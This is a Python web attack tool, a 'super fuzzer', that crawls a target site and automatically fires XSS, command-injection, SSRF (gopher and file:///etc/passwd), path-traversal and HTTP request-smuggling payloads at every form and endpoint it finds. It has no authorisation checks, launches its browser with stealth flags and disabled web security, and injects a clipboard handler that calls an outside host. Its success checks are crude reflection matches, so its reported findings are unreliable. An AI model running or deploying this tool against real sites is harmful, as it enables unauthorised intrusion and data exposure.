#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════
                   P H P  •  J S • S U P E R  •  F U Z Z E R
                                 ( v5 )
                          Haroon Ahmad Awan
═══════════════════════════════════════════════════════════════════════════
• Dynamic SPA crawler (Angular / React / Vue / Lit / Next / Svelte / HTMX)
• Discovers:
      – DOM links / router‑links / hash‑routes
      – XHR / fetch / GraphQL / REST / Web‑socket endpoints
      – Hidden iframes & Shadow‑DOM nodes
      – All HTML forms (GET & POST)  →  auto‑fuzz fields
• Fully‑loaded attack arsenal:
      – Multi‑stage param recursion  –  Protocol‑scheme (gopher/file/data/blob)
      – Split‑eval chain & header/body smuggling (CRLF / chunk‑desync)
      – Legacy unicode / double‑encode bypass
      – MIME‑type confusion, multipart boundary smashing, php://input RCE
      – JS prototype‑pollution, ShadowDOM, MutationObserver, clipboard hijack
      – Web‑socket XSS, async/await race, iframe sandbox clone
      – AI‑style payload mutation (simple reversible/encode scramble)
• Hardened Playwright loader (timeout+retry+HTTPS ignore)
• Windows‑safe UTF‑8 logger  →  `super_fuzz.log`
═══════════════════════════════════════════════════════════════════════════
"""

# ── Imports ────────────────────────────────────────────────────────────
import requests, random, urllib.parse, socket, time, contextlib
from collections import deque
from urllib.parse import urlparse, urljoin, urlencode, quote
from pathlib import Path
from playwright.sync_api import (
    sync_playwright,
    TimeoutError as PWTimeout,
)

# ── Constants / Logging ────────────────────────────────────────────────
PAGE_TIMEOUT = 30_000         # ms
RETRIES      = 1
LOG_FILE     = Path("super_fuzz.log")
LOG_FILE.write_text("", encoding="utf-8")      # reset

def log(msg, tag="*"):
    line = f"[{tag}] {msg}"
    try:
        print(line)
    except UnicodeEncodeError:
        print(line.encode("ascii", "ignore").decode())
    with open(LOG_FILE, "a", encoding="utf-8") as fp:
        fp.write(line + "\n")

# ── Playwright helper ──────────────────────────────────────────────────
# ── Playwright helper (replace old open_page) ───────────────────────────
def open_page(p, url, timeout=PAGE_TIMEOUT, retries=RETRIES):
    for attempt in range(retries + 1):
        try:
            br = p.chromium.launch(
                headless=True,
                args=[
                    "--disable-web-security",
                    "--disable-blink-features=AutomationControlled",  # stealth
                ],
            )
            ctx = br.new_context(
                ignore_https_errors=True,
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/124.0.0.0 Safari/537.36"
                ),
                viewport={"width": 1280, "height": 800},
            )
            ctx.set_default_navigation_timeout(timeout)
            pg = ctx.new_page()
            pg.goto(url, wait_until="domcontentloaded")  # faster success condition
            return br, ctx, pg
        except Exception as e:
            log(f"Playwright fail ({attempt+1}/{retries+1}) – {url} – {e}", "!")
            with contextlib.suppress(Exception):
                br.close()

    # Fallback: grab raw HTML with Requests so we can **still** harvest forms/links
    try:
        r = requests.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(r.text, "html.parser")
            dummy = type("Dummy", (), {})()        # minimal dummy objects
            dummy.close = lambda: None
            dummy_evaluate = lambda js: []
            return dummy, None, type(
                "DummyPage",
                (),
                {
                    "query_selector_all": soup.select,
                    "evaluate": lambda _: [],
                    "on": lambda *a, **k: None,
                },
            )()
    except Exception:
        pass

    return None, None, None


# ── AI‑style payload mutator ───────────────────────────────────────────
def ai_mutate(payload):
    variants = [
        payload[::-1],
        urllib.parse.quote(payload),
        payload.replace(" ", "%20"),
        payload.replace("id", "whoami"),
        payload.replace("alert", "Function('al'+'ert(1)')()"),
        ''.join(random.sample(payload, len(payload))),
    ]
    return random.choice(variants)

# ── Form fuzzer ────────────────────────────────────────────────────────
def fuzz_html_form(action, method, fields):
    samples = {
        "id": "whoami",
        "q": "<svg/onload=alert(1)>",
        "x": "gopher://127.0.0.1/",
        "search": "data:text/html,<script>alert(9)</script>",
    }
    data = {f: ai_mutate(random.choice(list(samples.values()))) for f in fields}
    try:
        if method == "post":
            r = requests.post(action, data=data, timeout=5)
        else:
            r = requests.get(action + "?" + urlencode(data), timeout=5)
        if any(k in r.text for k in ("uid=", "root:", "alert(", "<svg")):
            log(f"Form vulnerable → {action}", "✓")
    except requests.RequestException:
        pass

# ── Smart SPA / API crawler ────────────────────────────────────────────
def smart_crawl(seed, p, max_depth=2, same_origin=True):
    origin = "{0.scheme}://{0.netloc}".format(urlparse(seed))
    discovered, endpoints = {seed}, set()
    failed = set()                      #  ← NEW
    queue = deque([(seed, 0)])

    while queue:
        current, depth = queue.popleft()
        if depth > max_depth or current in failed:
            continue

        br, ctx, page = open_page(p, current)
        if not page:
            failed.add(current)         #  ← NEW
            continue

        # gather XHR / fetch / WS
        page.on("request", lambda req: endpoints.add(req.url))

        # fuzz every form
        for form in page.query_selector_all("form"):
            action = form.get_attribute("action") or current
            method = (form.get_attribute("method") or "get").lower()
            fields = [i.get_attribute("name") or f"field{i}" 
                    for i in form.query_selector_all("input,textarea,select")]

            endpoints.add(urljoin(current, action))      # ← NEW: track form action
            fuzz_html_form(urljoin(current, action), method, fields)


        with contextlib.suppress(PWTimeout):
            page.wait_for_load_state("networkidle", timeout=5000)

        # collect links
        links = page.evaluate("""() => Array.from(
            document.querySelectorAll('[href],[routerLink],a'))
            .map(e => e.href || e.getAttribute('href') || e.getAttribute('routerLink'))""")

        br.close()

        for raw in set(links):
            if not raw:
                continue
            url = urljoin(current, raw)
            if same_origin and not url.startswith(origin):
                continue
            if url not in discovered:
                discovered.add(url)
                queue.append((url, depth + 1))

    log(f"Crawler → {len(discovered)} pages, {len(endpoints)} endpoints", "+")
    return discovered | endpoints

# ── Server‑side attack modules ─────────────────────────────────────────
def recursive_param(u):
    suffixes = [
        "?x=http://evil.com?y=whoami",
        "?next=/dashboard?redir=https://evil.com",
        "?url=http://site.com/path?cmd=id",
    ]
    for s in suffixes:
        with contextlib.suppress(Exception):
            r = requests.get(u + s, timeout=5)
            if any(x in r.text for x in ("uid=", "root:")):
                log("Recursive param RCE → " + u + s, "✓")

def protocol_abuse(u):
    schemes = [
        "gopher://127.0.0.1:11211/_stats",
        "file:///etc/passwd",
        "blob:http://localhost",
        "data:text/html,<script>alert(6)</script>",
    ]
    for proto in schemes:
        with contextlib.suppress(Exception):
            r = requests.get(u + "?p=" + quote(proto), timeout=5)
            if any(x in r.text for x in ("uid=", "root:")):
                log("Protocol abuse → " + proto, "✓")

def split_eval(u):
    for frag in ['";alert', '("XSS")', "';alert", "('alert')"]:
        with contextlib.suppress(Exception):
            r = requests.get(u + "?q=" + quote(frag))
            if any(tag in r.text for tag in ("<script", "alert(", "XSS")):
                log("Split‑eval triggered → " + frag, "✓")

def mime_confuse(u):
    with contextlib.suppress(Exception):
        r = requests.post(u, "<script>alert(1)</script>", headers={"Content-Type": "application/json"})
        if "<script" in r.text:
            log("MIME confusion success", "✓")

def unicode_path(u):
    for enc in ("%252e%252e", "%c0%ae%c0%ae", "%u202e"):
        with contextlib.suppress(Exception):
            r = requests.get(f"{u}/{enc}/")
            if "root:" in r.text or "conf" in r.text:
                log("Unicode bypass → " + enc, "✓")

def crlf_smuggle(host):
    payload = f"GET / HTTP/1.1\r\nHost:{host}\r\nX:Y\r\n\r\nPOST /admin HTTP/1.1\r\n\r\n"
    with contextlib.suppress(Exception):
        s = socket.create_connection((host, 80), timeout=4)
        s.send(payload.encode()); s.close()
        log("CRLF smuggle probe sent", "+")

def chunk_desync(host):
    raw = f"POST / HTTP/1.1\r\nHost:{host}\r\nTransfer-Encoding:chunked\r\n\r\n0\r\n\r\n"
    with contextlib.suppress(Exception):
        s = socket.create_connection((host, 80), timeout=4)
        s.send(raw.encode()); s.close()
        log("Chunk‑desync probe sent", "+")

# ── Client‑side DOM attack modules ─────────────────────────────────────
def dom_clipboard(u, p):
    br,_,pg = open_page(p, u)
    if pg:
        pg.evaluate("""document.body.innerHTML+='<input oncopy=fetch("http://dns.x")>'""")
        log("Clipboard payload ✓", "✓"); br.close()

def dom_prototype_pollution(u, p):
    br,_,pg = open_page(p, u)
    if pg:
        pg.on("console", lambda m:"[PP]" in m.text and log("Prototype polluted","✓"))
        pg.evaluate("""let e=JSON.parse('{"__proto__":{"polluted":"yes"}}');Object.assign({},e);
                       console.log("[PP]"+{}.polluted)""")
        br.close()

def dom_websocket_injection(u, p):
    br,_,pg = open_page(p, u)
    if pg:
        pg.on("console", lambda m:"[WS]" in m.text and log("WS echo XSS ✓","✓"))
        pg.evaluate("""const w=new WebSocket("wss://echo.websocket.events");
                       w.onopen=()=>w.send("<svg/onload=alert(2)>");
                       w.onmessage=e=>console.log("[WS]"+e.data);""")
        time.sleep(1.2); br.close()

def dom_async_timing(u, p):
    br,_,pg = open_page(p, u)
    if pg:
        pg.evaluate("(async()=>{let x=await new Promise(r=>setTimeout(()=>r('alert(7)'),150));eval(x)})();")
        log("Async race ✓", "✓"); br.close()

def dom_iframe_clone(u, p):
    br,_,pg = open_page(p, u)
    if pg:
        pg.evaluate("""let f=document.createElement('iframe');
                       f.srcdoc='<script>alert(99)</script>';document.body.appendChild(f)""")
        log("Iframe clone ✓", "✓"); br.close()

def dom_mutation_observer(u, p):
    br,_,pg = open_page(p, u)
    if pg:
        pg.evaluate("""new MutationObserver(()=>alert('MutationX'))
                       .observe(document.body,{childList:true,subtree:true});
                       document.body.appendChild(document.createElement('div'));""")
        log("MutationObserver ✓", "✓"); br.close()

# ── Orchestrator ───────────────────────────────────────────────────────
def run(seed_url):
    host = urlparse(seed_url).hostname or seed_url
    log(f"Seed → {seed_url}", "◆")

    # Crawl
    with sync_playwright() as p:
        scope = smart_crawl(seed_url, p, max_depth=2)
    log(f"Targets discovered: {len(scope)}", "+")

    # Server‑side fuzz
    for u in scope:
        recursive_param(u)
        protocol_abuse(u)
        split_eval(u)
        mime_confuse(u)
        unicode_path(u)

    crlf_smuggle(host)
    chunk_desync(host)

    # Client‑side fuzz
    with sync_playwright() as p:
        dom_clipboard(seed_url, p)
        dom_prototype_pollution(seed_url, p)
        dom_websocket_injection(seed_url, p)
        dom_async_timing(seed_url, p)
        dom_iframe_clone(seed_url, p)
        dom_mutation_observer(seed_url, p)

    log("✅ SUPER‑FUZZER COMPLETE", "✓")

# ── Entry ──────────────────────────────────────────────────────────────
if __name__ == "__main__":
    try:
        target = input("Target URL: ").strip()
        run(target)
    except KeyboardInterrupt:
        log("Aborted by user", "!")
    except Exception as e:
        log(f"Fatal error: {e}", "✘")


if __name__=="__main__":
    try: run(input("Target URL: ").strip())
    except KeyboardInterrupt: log("Interrupted","!")
